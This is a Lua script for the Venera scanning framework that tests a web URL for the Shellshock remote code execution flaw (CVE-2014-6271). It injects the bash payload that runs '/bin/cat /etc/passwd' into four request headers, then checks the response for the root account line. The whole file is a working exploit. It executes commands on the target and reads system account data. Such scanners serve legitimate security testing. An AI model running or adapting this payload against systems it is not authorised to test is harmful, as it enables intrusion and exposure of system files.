-- Script for Venera Framework
-- https://github.com/farinap5/Venera
local regex = require("regexp")
local http = require("http")
local client = http.client()

-- Metadata
METADATA = {
    AUTHOR = {"farinap5 <null>"},
    VERSION = "1.0",
    TAGS = {"cve","rce","http","bash","scanner"},
    INFO = [[Shellshock Remote Code Execution CVE-2014-6271]]
}

-- Arguments/Variables needed to execute script
VARS = {
    URL = {VALUE="http://example.com", NEEDED="yes", DESCRIPT="URL with path."},
    METHOD = {VALUE="GET", NEEDED="yes", DESCRIPT="Method"},
    VERBOSE = {VALUE="false", NEEDED="no", DESCRIPT="Verbose output."}
}

function Init()
    Meta(METADATA) -- Load metadata 
    LoadVars(VARS) -- Load variables
end

function Main()
    local request = http.request(VARS.METHOD.VALUE, VARS.URL.VALUE)

    request:header_set("Cookie", "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ")
    request:header_set("Referer", "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ")
    request:header_set("Shellshock", "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ")
    request:header_set("User-Agent", "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ")

    local r, err = client:do_request(request)
    if err then error(err) end

    local r,e = regex.match("root:[x*]:0:0:", r.body)
    if e then error(e) end
    if r == true then
        PrintSuccsln("Vulnerable to RCE via Shellshock exploitation.")
    else
        if VARS.VERBOSE.VALUE == "true" then
            PrintErrln(VARS.URL.VALUE.." not vulnerable to RCE via Shellshock exploitation.")
        end
    end
end